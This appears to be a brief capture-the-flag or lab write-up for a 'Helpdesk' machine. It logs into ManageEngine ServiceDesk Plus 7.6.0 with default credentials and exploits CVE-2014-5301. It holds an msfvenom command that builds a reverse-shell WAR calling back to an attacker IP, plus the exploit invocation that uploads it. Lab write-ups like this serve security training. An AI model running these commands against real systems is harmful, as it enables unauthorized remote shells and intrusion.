# Helpdesk

### Enumeration

http://192.168.112.43:8080/ - ManageEngine ServiceDesk Plus 7.6.0

Default credentials -> administrator:administrator

ManageEngine (Multiple Products) - (Authenticated) Arbitrary File Upload (Metasploit)

[https://www.exploit-db.com/exploits/35845](https://www.exploit-db.com/exploits/35845)

Not msf -> [https://github.com/PeterSufliarsky/exploits/blob/master/CVE-2014-5301.py](https://github.com/PeterSufliarsky/exploits/blob/master/CVE-2014-5301.py)

### Access

```
$ msfvenom -p java/shell_reverse_tcp LHOST=192.168.49.112 LPORT=80 -f war > shell.war
```

> Script usage: python3 CVE-2014-5301.py HOST PORT USERNAME PASSWORD WARFILE

```
$ python3 CVE-2014-5301.py 192.168.112.43 8080 administrator administrator shell.war
```
